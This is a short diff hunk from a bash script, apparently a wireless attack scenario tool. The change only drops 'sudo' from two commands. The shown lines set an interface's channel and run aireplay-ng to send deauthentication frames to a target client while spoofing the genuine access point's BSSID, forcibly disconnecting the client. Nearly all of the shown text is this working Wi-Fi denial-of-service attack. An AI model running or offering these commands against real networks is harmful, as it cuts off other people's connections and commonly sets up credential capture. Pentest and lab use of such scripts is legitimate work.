@@ -61,14 +61,14 @@ print_blank
 
 # --- Set Channel ---
 print_action "Setting interface $INTERFACE to channel $SCN_CHANNEL..."
-sudo iw dev "$INTERFACE" set channel "$SCN_CHANNEL"
+iw dev "$INTERFACE" set channel "$SCN_CHANNEL"
 print_success "Channel set to $SCN_CHANNEL."
 print_blank
 
 # --- Launch Forced Disconnect ---
 print_action "Sending deauthentication frames to client $SCN_CLIENT_MAC"
 print_none "Spoofing genuine AP BSSID: $SCN_TARGET_BSSID"
-sudo aireplay-ng --deauth 5 -a "$SCN_TARGET_BSSID" -c "$SCN_CLIENT_MAC" "$INTERFACE"
+aireplay-ng --deauth 5 -a "$SCN_TARGET_BSSID" -c "$SCN_CLIENT_MAC" "$INTERFACE"
 print_success "Deauthentication frames sent."
 print_blank
 
